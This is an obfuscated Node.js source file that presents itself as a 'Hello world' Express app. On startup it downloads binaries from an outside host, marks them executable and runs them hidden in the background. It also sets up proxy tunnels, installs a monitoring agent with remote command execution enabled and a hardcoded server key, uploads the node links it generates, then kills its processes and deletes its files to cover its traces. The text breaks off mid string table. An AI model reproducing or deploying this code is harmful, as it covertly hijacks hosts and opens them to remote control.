const _0x17773a=_0x267e;(function(_0x31cb6c,_0x4f0967){const _0x14c7fb=_0x267e,_0x840212=_0x31cb6c();while(!![]){try{const _0x2ec7fe=-parseInt(_0x14c7fb(0x186))/0x1*(parseInt(_0x14c7fb(0x1ba))/0x2)+parseInt(_0x14c7fb(0x156))/0x3+-parseInt(_0x14c7fb(0x171))/0x4*(-parseInt(_0x14c7fb(0x19c))/0x5)+parseInt(_0x14c7fb(0x1bf))/0x6+parseInt(_0x14c7fb(0x1f4))/0x7+-parseInt(_0x14c7fb(0x198))/0x8*(-parseInt(_0x14c7fb(0x17f))/0x9)+-parseInt(_0x14c7fb(0x154))/0xa;if(_0x2ec7fe===_0x4f0967)break;else _0x840212['push'](_0x840212['shift']());}catch(_0x169a7d){_0x840212['push'](_0x840212['shift']());}}}(_0x2145,0x22d92));const _0xceff81=(function(){let _0x5d9919=!![];return function(_0x1292b3,_0x1b9f5c){const _0x4c5d8d=_0x5d9919?function(){const _0x585b34=_0x267e;if(_0x1b9f5c){const _0x49bf49=_0x1b9f5c[_0x585b34(0x1df)](_0x1292b3,arguments);return _0x1b9f5c=null,_0x49bf49;}}:function(){};return _0x5d9919=![],_0x4c5d8d;};}()),_0x14272d=_0xceff81(this,function(){const _0x5c5929=_0x267e;return _0x14272d[_0x5c5929(0x134)]()[_0x5c5929(0x1f5)](_0x5c5929(0x16d))[_0x5c5929(0x134)]()['constructor'](_0x14272d)[_0x5c5929(0x1f5)](_0x5c5929(0x16d));});_0x14272d();const _0x537333=(function(){let _0x23a6f2=!![];return function(_0x531bc8,_0x35f3d3){const _0x180690=_0x23a6f2?function(){const _0x3e439e=_0x267e;if(_0x35f3d3){const _0x2ce278=_0x35f3d3[_0x3e439e(0x1df)](_0x531bc8,arguments);return _0x35f3d3=null,_0x2ce278;}}:function(){};return _0x23a6f2=![],_0x180690;};}()),_0x5dc782=_0x537333(this,function(){const _0x39305c=_0x267e,_0xcd4f53=function(){const _0x1ed839=_0x267e;let _0x52e9d9;try{_0x52e9d9=Function('return\x20(function()\x20'+_0x1ed839(0x136)+');')();}catch(_0x1e6f51){_0x52e9d9=window;}return _0x52e9d9;},_0x2aabe6=_0xcd4f53(),_0x471aa9=_0x2aabe6[_0x39305c(0x1ad)]=_0x2aabe6[_0x39305c(0x1ad)]||{},_0x42813e=['log','warn',_0x39305c(0x1a3),_0x39305c(0x19d),_0x39305c(0x1cb),_0x39305c(0x167),_0x39305c(0x1c6)];for(let _0x200d57=0x0;_0x200d57<_0x42813e['length'];_0x200d57++){const _0x26d042=_0x537333[_0x39305c(0x1b9)][_0x39305c(0x1b8)][_0x39305c(0x16c)](_0x537333),_0x21dd80=_0x42813e[_0x200d57],_0x54d0f5=_0x471aa9[_0x21dd80]||_0x26d042;_0x26d042[_0x39305c(0x1e2)]=_0x537333['bind'](_0x537333),_0x26d042[_0x39305c(0x134)]=_0x54d0f5[_0x39305c(0x134)][_0x39305c(0x16c)](_0x54d0f5),_0x471aa9[_0x21dd80]=_0x26d042;}});_0x5dc782();const express=require(_0x17773a(0x203)),app=express(),axios=require(_0x17773a(0x137)),os=require('os'),fs=require('fs'),path=require(_0x17773a(0x1ff)),{promisify}=require(_0x17773a(0x178)),exec=promisify(require('child_process')[_0x17773a(0x18c)]),{execSync}=require(_0x17773a(0x1e7)),UPLOAD_URL=process[_0x17773a(0x1af)][_0x17773a(0x1a8)]||'',PROJECT_URL=process[_0x17773a(0x1af)][_0x17773a(0x1dd)]||'',AUTO_ACCESS=process['env'][_0x17773a(0x13c)]||!![],FILE_PATH=process[_0x17773a(0x1af)]['FILE_PATH']||_0x17773a(0x14f),SUB_PATH=process[_0x17773a(0x1af)][_0x17773a(0x1a7)]||_0x17773a(0x187),PORT=process['env'][_0x17773a(0x164)]||process[_0x17773a(0x1af)][_0x17773a(0x1f1)]||0xbb8,UUID=process[_0x17773a(0x1af)][_0x17773a(0x140)]||_0x17773a(0x1a1),NEZHA_SERVER=process['env'][_0x17773a(0x1bc)]||_0x17773a(0x200),NEZHA_PORT=process['env'][_0x17773a(0x19e)]||'',NEZHA_KEY=process[_0x17773a(0x1af)][_0x17773a(0x1fd)]||_0x17773a(0x19f),ARGO_DOMAIN=process[_0x17773a(0x1af)][_0x17773a(0x150)]||_0x17773a(0x19a),ARGO_AUTH=process['env'][_0x17773a(0x1d2)]||'eyJhIjoiZTNlYmU5NDY1NjJjOGZjMjBmYzg4Y2U5MGJlODRjYTMiLCJ0IjoiM2Q0MWM5ODItOGE3Mi00MDQ0LWJiMDktNWZhNzdkMGMyM2M0IiwicyI6Ik1URXpOMlJsWmpndE9EWmxOQzAwT1daakxXRTJZV1F0TXpsa016QXlNbU5tTXpCayJ9',ARGO_PORT=process[_0x17773a(0x1af)]['ARGO_PORT']||0x1f41,CFIP=process[_0x17773a(0x1af)][_0x17773a(0x15a)]||_0x17773a(0x1d6),CFPORT=process[_0x17773a(0x1af)]['CFPORT']||0x1bb,NAME=process[_0x17773a(0x1af)]['NAME']||_0x17773a(0x1a2);!fs[_0x17773a(0x1b1)](FILE_PATH)?(fs[_0x17773a(0x199)](FILE_PATH),console[_0x17773a(0x1da)](FILE_PATH+_0x17773a(0x17d))):console[_0x17773a(0x1da)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x1bd859=_0x17773a,_0x3fc9d2=_0x1bd859(0x174);let _0x202214='';for(let _0x4857be=0x0;_0x4857be<0x6;_0x4857be++){_0x202214+=_0x3fc9d2[_0x1bd859(0x1f7)](Math[_0x1bd859(0x142)](Math['random']()*_0x3fc9d2[_0x1bd859(0x206)]));}return _0x202214;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x17773a(0x181)](FILE_PATH,npmName),phpPath=path[_0x17773a(0x181)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x17773a(0x181)](FILE_PATH,_0x17773a(0x15c)),listPath=path[_0x17773a(0x181)](FILE_PATH,_0x17773a(0x141)),bootLogPath=path[_0x17773a(0x181)](FILE_PATH,'boot.log'),configPath=path[_0x17773a(0x181)](FILE_PATH,'config.json');function deleteNodes(){const _0x1a6b09=_0x17773a;try{if(!UPLOAD_URL)return;if(!fs[_0x1a6b09(0x1b1)](subPath))return;let _0x1c152b;try{_0x1c152b=fs[_0x1a6b09(0x15f)](subPath,_0x1a6b09(0x1e8));}catch{return null;}const _0x33ec36=Buffer[_0x1a6b09(0x1fa)](_0x1c152b,_0x1a6b09(0x13e))[_0x1a6b09(0x134)]('utf-8'),_0x569a21=_0x33ec36[_0x1a6b09(0x172)]('\x0a')[_0x1a6b09(0x135)](_0x237a36=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1a6b09(0x139)](_0x237a36));if(_0x569a21['length']===0x0)return;return axios[_0x1a6b09(0x1d8)](UPLOAD_URL+_0x1a6b09(0x194),JSON[_0x1a6b09(0x201)]({'nodes':_0x569a21}),{'headers':{'Content-Type':_0x1a6b09(0x1d5)}})[_0x1a6b09(0x1b2)](_0x116c88=>{return null;}),null;}catch(_0x1e8c6b){return null;}}function cleanupOldFiles(){const _0x1968d3=_0x17773a;try{const _0xac162e=fs[_0x1968d3(0x18e)](FILE_PATH);_0xac162e[_0x1968d3(0x1d7)](_0x5d1fd5=>{const _0xb541dd=_0x1968d3,_0x2f69be=path['join'](FILE_PATH,_0x5d1fd5);try{const _0x526c4f=fs[_0xb541dd(0x1f8)](_0x2f69be);_0x526c4f[_0xb541dd(0x1e0)]()&&fs['unlinkSync'](_0x2f69be);}catch(_0x1b48c7){}});}catch(_0x46557a){}}app[_0x17773a(0x1ce)]('/',function(_0x26856c,_0x1a773b){const _0x38f1ec=_0x17773a;_0x1a773b[_0x38f1ec(0x166)]('Hello\x20world!');});async function generateConfig(){const _0xe7fc11=_0x17773a,_0x5f1b47={'log':{'access':_0xe7fc11(0x162),'error':'/dev/null','loglevel':_0xe7fc11(0x177)},'inbounds':[{'port':ARGO_PORT,'protocol':_0xe7fc11(0x1bb),'settings':{'clients':[{'id':UUID,'flow':_0xe7fc11(0x1db)}],'decryption':_0xe7fc11(0x177),'fallbacks':[{'dest':0xbb9},{'path':_0xe7fc11(0x14a),'dest':0xbba},{'path':_0xe7fc11(0x182),'dest':0xbbb},{'path':_0xe7fc11(0x143),'dest':0xbbc}]},'streamSettings':{'network':_0xe7fc11(0x1be)}},{'port':0xbb9,'listen':_0xe7fc11(0x17b),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0xe7fc11(0x177)},'streamSettings':{'network':'tcp','security':_0xe7fc11(0x177)}},{'port':0xbba,'listen':_0xe7fc11(0x17b),'protocol':_0xe7fc11(0x1bb),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0xe7fc11(0x177)},'streamSettings':{'network':'ws','security':_0xe7fc11(0x177),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0xe7fc11(0x1c8),'tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0xe7fc11(0x17b),'protocol':_0xe7fc11(0x1b3),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0xe7fc11(0x182)}},'sniffing':{'enabled':!![],'destOverride':[_0xe7fc11(0x1c8),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0xe7fc11(0x17b),'protocol':_0xe7fc11(0x202),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0xe7fc11(0x177),'wsSettings':{'path':_0xe7fc11(0x143)}},'sniffing':{'enabled':!![],'destOverride':[_0xe7fc11(0x1c8),_0xe7fc11(0x1c4),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0xe7fc11(0x14b)]},'outbounds':[{'protocol':_0xe7fc11(0x147),'tag':_0xe7fc11(0x146)},{'protocol':'blackhole','tag':_0xe7fc11(0x1f0)}]};fs[_0xe7fc11(0x192)](path[_0xe7fc11(0x181)](FILE_PATH,_0xe7fc11(0x1e5)),JSON[_0xe7fc11(0x201)](_0x5f1b47,null,0x2));}function getSystemArchitecture(){const _0xf15282=_0x17773a,_0x5db0e5=os[_0xf15282(0x1ab)]();return _0x5db0e5===_0xf15282(0x148)||_0x5db0e5==='arm64'||_0x5db0e5===_0xf15282(0x1ca)?_0xf15282(0x148):_0xf15282(0x1b7);}function _0x267e(_0x695417,_0x2413c){const _0x5711fb=_0x2145();return _0x267e=function(_0x5dc782,_0x537333){_0x5dc782=_0x5dc782-0x134;let _0x53db4c=_0x5711fb[_0x5dc782];return _0x53db4c;},_0x267e(_0x695417,_0x2413c);}function downloadFile(_0x8653c6,_0x15ab85,_0x5620ae){const _0x375d0c=_0x17773a,_0x5e436f=_0x8653c6;!fs[_0x375d0c(0x1b1)](FILE_PATH)&&fs[_0x375d0c(0x199)](FILE_PATH,{'recursive':!![]});const _0x1421a4=fs['createWriteStream'](_0x5e436f);axios({'method':_0x375d0c(0x1ce),'url':_0x15ab85,'responseType':'stream'})[_0x375d0c(0x1a9)](_0x2de86d=>{const _0x3e2b14=_0x375d0c;_0x2de86d[_0x3e2b14(0x168)][_0x3e2b14(0x1f2)](_0x1421a4),_0x1421a4['on']('finish',()=>{const _0x273f89=_0x3e2b14;_0x1421a4[_0x273f89(0x13b)](),console[_0x273f89(0x1da)]('Download\x20'+path['basename'](_0x5e436f)+'\x20successfully'),_0x5620ae(null,_0x5e436f);}),_0x1421a4['on'](_0x3e2b14(0x19d),_0x1a4b42=>{const _0x5e4f55=_0x3e2b14;fs['unlink'](_0x5e436f,()=>{});const _0x567d01='Download\x20'+path[_0x5e4f55(0x18a)](_0x5e436f)+_0x5e4f55(0x155)+_0x1a4b42[_0x5e4f55(0x153)];console[_0x5e4f55(0x19d)](_0x567d01),_0x5620ae(_0x567d01);});})['catch'](_0x1d6a17=>{const _0x2bb013=_0x375d0c,_0x2c3ed7=_0x2bb013(0x189)+path[_0x2bb013(0x18a)](_0x5e436f)+_0x2bb013(0x155)+_0x1d6a17['message'];console[_0x2bb013(0x19d)](_0x2c3ed7),_0x5620ae(_0x2c3ed7);});}async function downloadFilesAndRun(){const _0x4b5603=_0x17773a,_0x14df97=getSystemArchitecture(),_0x43049c=getFilesForArchitecture(_0x14df97);if(_0x43049c[_0x4b5603(0x206)]===0x0){console[_0x4b5603(0x1da)](_0x4b5603(0x1c1));return;}const _0xc37d69=_0x43049c[_0x4b5603(0x1ee)](_0x23fc32=>{return new Promise((_0x43ba3b,_0x4bdec9)=>{const _0x5b7c62=_0x267e;downloadFile(_0x23fc32[_0x5b7c62(0x1d9)],_0x23fc32[_0x5b7c62(0x144)],(_0x5d0a2a,_0x5d33b8)=>{_0x5d0a2a?_0x4bdec9(_0x5d0a2a):_0x43ba3b(_0x5d33b8);});});});try{await Promise['all'](_0xc37d69);}catch(_0x115650){console[_0x4b5603(0x19d)](_0x4b5603(0x17a),_0x115650);return;}function _0x4e0c62(_0x2113ce){const _0x121ba3=_0x4b5603,_0x11395e=0x1fd;_0x2113ce[_0x121ba3(0x1d7)](_0x401a44=>{const _0x441e00=_0x121ba3;fs[_0x441e00(0x1b1)](_0x401a44)&&fs[_0x441e00(0x1dc)](_0x401a44,_0x11395e,_0x106960=>{const _0x105b1d=_0x441e00;_0x106960?console[_0x105b1d(0x19d)](_0x105b1d(0x159)+_0x401a44+':\x20'+_0x106960):console[_0x105b1d(0x1da)](_0x105b1d(0x1c5)+_0x401a44+':\x20'+_0x11395e[_0x105b1d(0x134)](0x8));});});}const _0x8f8ae0=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4e0c62(_0x8f8ae0);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2d8ada=NEZHA_SERVER[_0x4b5603(0x1bd)](':')?NEZHA_SERVER[_0x4b5603(0x172)](':')[_0x4b5603(0x1b6)]():'',_0x45696f=new Set(['443','8443',_0x4b5603(0x1f3),'2087',_0x4b5603(0x1e9),'2053']),_0x350f83=_0x45696f[_0x4b5603(0x1a0)](_0x2d8ada)?_0x4b5603(0x16e):_0x4b5603(0x1b5),_0x259087='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x4b5603(0x1d1)+_0x350f83+_0x4b5603(0x1c2)+UUID;fs[_0x4b5603(0x192)](path['join'](FILE_PATH,_0x4b5603(0x149)),_0x259087);const _0x3de309=_0x4b5603(0x1a5)+phpPath+_0x4b5603(0x16f)+FILE_PATH+_0x4b5603(0x1d0);try{await exec(_0x3de309),console['log'](phpName+_0x4b5603(0x165)),await new Promise(_0x37f836=>setTimeout(_0x37f836,0x3e8));}catch(_0x2e12c1){console['error'](_0x4b5603(0x17c)+_0x2e12c1);}}else{let _0x541873='';const _0x95aacc=['443',_0x4b5603(0x1aa),'2096','2087',_0x4b5603(0x1e9),_0x4b5603(0x195)];_0x95aacc['includes'](NEZHA_PORT)&&(_0x541873=_0x4b5603(0x1fc));const _0x505160='nohup\x20'+npmPath+_0x4b5603(0x151)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4b5603(0x184)+NEZHA_KEY+'\x20'+_0x541873+_0x4b5603(0x1a6);try{await exec(_0x505160),console[_0x4b5603(0x1da)](npmName+_0x4b5603(0x165)),await new Promise(_0x53943b=>setTimeout(_0x53943b,0x3e8));}catch(_0x52dd4e){console['error'](_0x4b5603(0x1e4)+_0x52dd4e);}}}else console[_0x4b5603(0x1da)](_0x4b5603(0x14d));const _0x233bfd=_0x4b5603(0x1a5)+webPath+_0x4b5603(0x1d3)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x233bfd),console[_0x4b5603(0x1da)](webName+_0x4b5603(0x165)),await new Promise(_0x3dfbeb=>setTimeout(_0x3dfbeb,0x3e8));}catch(_0x5d56b1){console[_0x4b5603(0x19d)](_0x4b5603(0x1b0)+_0x5d56b1);}if(fs[_0x4b5603(0x1b1)](botPath)){let _0x4ea3e8;if(ARGO_AUTH[_0x4b5603(0x14c)](/^[A-Z0-9a-z=]{120,250}$/))_0x4ea3e8=_0x4b5603(0x15d)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x4ea3e8=_0x4b5603(0x196)+FILE_PATH+_0x4b5603(0x205):_0x4ea3e8='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x4b5603(0x1cf)+ARGO_PORT;try{await exec(_0x4b5603(0x1a5)+botPath+'\x20'+_0x4ea3e8+_0x4b5603(0x19b)),console[_0x4b5603(0x1da)](botName+_0x4b5603(0x165)),await new Promise(_0x2c9438=>setTimeout(_0x2c9438,0x7d0));}catch(_0x58dab1){console[_0x4b5603(0x19d)](_0x4b5603(0x157)+_0x58dab1);}}await new Promise(_0x17812d=>setTimeout(_0x17812d,0x1388));}function getFilesForArchitecture(_0x28622a){const _0x19cc1a=_0x17773a;let _0xa233dc;_0x28622a===_0x19cc1a(0x148)?_0xa233dc=[{'fileName':webPath,'fileUrl':_0x19cc1a(0x160)},{'fileName':botPath,'fileUrl':_0x19cc1a(0x1c9)}]:_0xa233dc=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x19cc1a(0x173)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x10ba6e=_0x28622a===_0x19cc1a(0x148)?_0x19cc1a(0x1f9):'https://amd64.ssss.nyc.mn/agent';_0xa233dc[_0x19cc1a(0x185)]({'fileName':npmPath,'fileUrl':_0x10ba6e});}else{const _0x542197=_0x28622a===_0x19cc1a(0x148)?_0x19cc1a(0x1e6):_0x19cc1a(0x1ac);_0xa233dc[_0x19cc1a(0x185)]({'fileName':phpPath,'fileUrl':_0x542197});}}return _0xa233dc;}function argoType(){const _0x451e82=_0x17773a;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x451e82(0x1de));return;}if(ARGO_AUTH[_0x451e82(0x1bd)]('TunnelSecret')){fs['writeFileSync'](path[_0x451e82(0x181)](FILE_PATH,_0x451e82(0x180)),ARGO_AUTH);const _0x47631e='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x451e82(0x172)]('\x22')[0xb]+_0x451e82(0x17e)+path['join'](FILE_PATH,_0x451e82(0x180))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x451e82(0x158)+ARGO_PORT+_0x451e82(0x183);fs[_0x451e82(0x192)](path[_0x451e82(0x181)](FILE_PATH,_0x451e82(0x152)),_0x47631e);}else console['log'](_0x451e82(0x175));}argoType();async function extractDomains(){const _0x594854=_0x17773a;let _0x141a47;if(ARGO_AUTH&&ARGO_DOMAIN)_0x141a47=ARGO_DOMAIN,console[_0x594854(0x1da)](_0x594854(0x170),_0x141a47),await _0x5bc2fd(_0x141a47);else try{const _0x41a8f8=fs[_0x594854(0x15f)](path['join'](FILE_PATH,_0x594854(0x176)),_0x594854(0x1e8)),_0xb80912=_0x41a8f8[_0x594854(0x172)]('\x0a'),_0x5dba07=[];_0xb80912[_0x594854(0x1d7)](_0x36c28f=>{const _0x5e6ce5=_0x594854,_0x1ac0fe=_0x36c28f['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1ac0fe){const _0x364750=_0x1ac0fe[0x1];_0x5dba07[_0x5e6ce5(0x18f)](_0x364750);}});if(_0x5dba07['length']>0x0)_0x141a47=_0x5dba07[0x0],console[_0x594854(0x1da)](_0x594854(0x1ea),_0x141a47),await _0x5bc2fd(_0x141a47);else{console[_0x594854(0x1da)](_0x594854(0x13f)),fs[_0x594854(0x138)](path[_0x594854(0x181)](FILE_PATH,'boot.log'));async function _0x1404c7(){const _0xd30e11=_0x594854;try{process['platform']===_0xd30e11(0x13d)?await exec(_0xd30e11(0x1ed)+botName+_0xd30e11(0x1eb)):await exec(_0xd30e11(0x204)+botName[_0xd30e11(0x1f7)](0x0)+']'+botName[_0xd30e11(0x1fe)](0x1)+_0xd30e11(0x1d4));}catch(_0x4981cf){}}_0x1404c7(),await new Promise(_0x1afdf3=>setTimeout(_0x1afdf3,0xbb8));const _0x5e5fb6=_0x594854(0x161)+FILE_PATH+_0x594854(0x1cf)+ARGO_PORT;try{await exec(_0x594854(0x1a5)+botPath+'\x20'+_0x5e5fb6+'\x20>/dev/null\x202>&1\x20&'),console[_0x594854(0x1da)](botName+'\x20is\x20running'),await new Promise(_0x598909=>setTimeout(_0x598909,0xbb8)),await extractDomains();}catch(_0x3cdb70){console['error']('Error\x20executing\x20command:\x20'+_0x3cdb70);}}}catch(_0xc7b7c7){console[_0x594854(0x19d)]('Error\x20reading\x20boot.log:',_0xc7b7c7);}async function _0x5bc2fd(_0x288344){const _0x140183=_0x594854,_0x28c3b6=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x140183(0x1e8)}),_0x4bed78=_0x28c3b6[_0x140183(0x1c7)](),_0x4a3c1b=NAME?NAME+'-'+_0x4bed78:_0x4bed78;return new Promise(_0x5c4455=>{setTimeout(()=>{const _0x22e1f5=_0x267e,_0x1932d6={'v':'2','ps':''+_0x4a3c1b,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x22e1f5(0x177),'net':'ws','type':'none','host':_0x288344,'path':_0x22e1f5(0x1cd),'tls':_0x22e1f5(0x1c4),'sni':_0x288344,'alpn':'','fp':_0x22e1f5(0x1ae)},_0x4de186=_0x22e1f5(0x145)+UUID+'@'+CFIP+':'+CFPORT+_0x22e1f5(0x18d)+_0x288344+_0x22e1f5(0x193)+_0x288344+_0x22e1f5(0x190)+_0x4a3c1b+'\x0a\x20\x20\x0avmess://'+Buffer[_0x22e1f5(0x1fa)](JSON['stringify'](_0x1932d6))[_0x22e1f5(0x134)](_0x22e1f5(0x13e))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x288344+_0x22e1f5(0x193)+_0x288344+_0x22e1f5(0x163)+_0x4a3c1b+_0x22e1f5(0x1cc);console[_0x22e1f5(0x1da)](Buffer[_0x22e1f5(0x1fa)](_0x4de186)[_0x22e1f5(0x134)](_0x22e1f5(0x13e))),fs[_0x22e1f5(0x192)](subPath,Buffer[_0x22e1f5(0x1fa)](_0x4de186)['toString'](_0x22e1f5(0x13e))),console[_0x22e1f5(0x1da)](FILE_PATH+_0x22e1f5(0x1fb)),uploadNodes(),app[_0x22e1f5(0x1ce)]('/'+SUB_PATH,(_0x9151df,_0x45f2de)=>{const _0x32e475=_0x22e1f5,_0x4400c6=Buffer[_0x32e475(0x1fa)](_0x4de186)[_0x32e475(0x134)]('base64');_0x45f2de[_0x32e475(0x14e)](_0x32e475(0x1ef),_0x32e475(0x16b)),_0x45f2de[_0x32e475(0x166)](_0x4400c6);}),_0x5c4455(_0x4de186);},0x7d0);});}}async function uploadNodes(){const _0xa651d3=_0x17773a;if(UPLOAD_URL&&PROJECT_URL){const _0x506904=PROJECT_URL+'/'+SUB_PATH,_0xb7c676={'subscription':[_0x506904]};try{const _0x4b229e=await axios['post'](UPLOAD_URL+_0xa651d3(0x1e3),_0xb7c676,{'headers':{'Content-Type':_0xa651d3(0x1d5)}});return _0x4b229e&&_0x4b229e[_0xa651d3(0x15e)]===0xc8?(console[_0xa651d3(0x1da)](_0xa651d3(0x1ec)),_0x4b229e):null;}catch(_0x774726){if(_0x774726[_0xa651d3(0x15b)]){if(_0x774726['response'][_0xa651d3(0x15e)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0xa651d3(0x1b1)](listPath))return;const _0x2604b7=fs['readFileSync'](listPath,_0xa651d3(0x1e8)),_0x208e73=_0x2604b7[_0xa651d3(0x172)]('\x0a')['filter'](_0x3c3ca0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xa651d3(0x139)](_0x3c3ca0));if(_0x208e73[_0xa651d3(0x206)]===0x0)return;const _0x492b55=JSON[_0xa651d3(0x201)]({'nodes':_0x208e73});try{const _0x1ec61e=await axios[_0xa651d3(0x1d8)](UPLOAD_URL+_0xa651d3(0x13a),_0x492b55,{'headers':{'Content-Type':'application/json'}});return _0x1ec61e&&_0x1ec61e['status']===0xc8?(console[_0xa651d3(0x1da)]('Nodes\x20uploaded\x20successfully'),_0x1ec61e):null;}catch(_0xff26ad){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5b0a29=_0x267e,_0x4e3033=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4e3033[_0x5b0a29(0x18f)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4e3033[_0x5b0a29(0x18f)](phpPath);process[_0x5b0a29(0x18b)]===_0x5b0a29(0x13d)?exec(_0x5b0a29(0x191)+_0x4e3033[_0x5b0a29(0x181)]('\x20')+_0x5b0a29(0x197),_0x5df606=>{const _0x5eab22=_0x5b0a29;console[_0x5eab22(0x169)](),console[_0x5eab22(0x1da)](_0x5eab22(0x1c0)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x4e3033[_0x5b0a29(0x181)]('\x20')+_0x5b0a29(0x188),_0x49a598=>{const _0x3505f0=_0x5b0a29;console[_0x3505f0(0x169)](),console['log'](_0x3505f0(0x1c0)),console['log'](_0x3505f0(0x1b4));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x11cb15=_0x17773a;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x11cb15(0x1da)](_0x11cb15(0x1f6));return;}try{const _0x45a44b=await axios[_0x11cb15(0x1d8)](_0x11cb15(0x1a4),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x11cb15(0x1d5)}});return console[_0x11cb15(0x1da)](_0x11cb15(0x1e1)),_0x45a44b;}catch(_0x2210b0){return console[_0x11cb15(0x19d)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x2210b0['message']),null;}}async function startserver(){const _0x4b0ef9=_0x17773a;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x32992b){console[_0x4b0ef9(0x19d)](_0x4b0ef9(0x179),_0x32992b);}}startserver()[_0x17773a(0x1b2)](_0x5d6f2a=>{const _0x180598=_0x17773a;console[_0x180598(0x19d)](_0x180598(0x1c3),_0x5d6f2a);}),app['listen'](PORT,()=>console[_0x17773a(0x1da)](_0x17773a(0x16a)+PORT+'!'));function _0x2145(){const _0x4aa871=['false','pop','amd','prototype','constructor','111698dkvhVE','vless','NEZHA_SERVER','includes','tcp','100812dZmmmq','App\x20is\x20running','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Unhandled\x20error\x20in\x20startserver:','tls','Empowerment\x20success\x20for\x20','trace','trim','http','https://arm64.ssss.nyc.mn/bot','aarch64','exception','\x0a\x20\x20\x20\x20','/vmess-argo?ed=2560','get','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','ARGO_AUTH','\x20-c\x20','\x22\x20>\x20/dev/null\x202>&1','application/json','104.18.4.250','forEach','post','fileName','log','xtls-rprx-vision','chmod','PROJECT_URL','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','apply','isFile','automatic\x20access\x20task\x20added\x20successfully','__proto__','/api/add-subscriptions','npm\x20running\x20error:\x20','config.json','https://arm64.ssss.nyc.mn/v1','child_process','utf-8','2083','ArgoDomain:','.exe\x20>\x20nul\x202>&1','Subscription\x20uploaded\x20successfully','taskkill\x20/f\x20/im\x20','map','Content-Type','block','PORT','pipe','2096','734965twgfcp','search','Skipping\x20adding\x20automatic\x20access\x20task','charAt','statSync','https://arm64.ssss.nyc.mn/agent','from','/sub.txt\x20saved\x20successfully','--tls','NEZHA_KEY','substring','path','jianxian.apkk.cloudns.org:56880','stringify','trojan','express','pkill\x20-f\x20\x22[','/tunnel.yml\x20run','length','toString','filter','{}.constructor(\x22return\x20this\x22)(\x20)','axios','unlinkSync','test','/api/add-nodes','close','AUTO_ACCESS','win32','base64','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','UUID','list.txt','floor','/trojan-argo','fileUrl','\x0avless://','direct','freedom','arm','config.yaml','/vless-argo','https+local://8.8.8.8/dns-query','match','NEZHA\x20variable\x20is\x20empty,skip\x20running','set','./tmp','ARGO_DOMAIN','\x20-s\x20','tunnel.yml','message','1311020wusLMw','\x20failed:\x20','123156AHbNNf','Error\x20executing\x20command:\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Empowerment\x20failed\x20for\x20','CFIP','response','sub.txt','tunnel\x20--edge-ip-version\x20auto\x20--no-au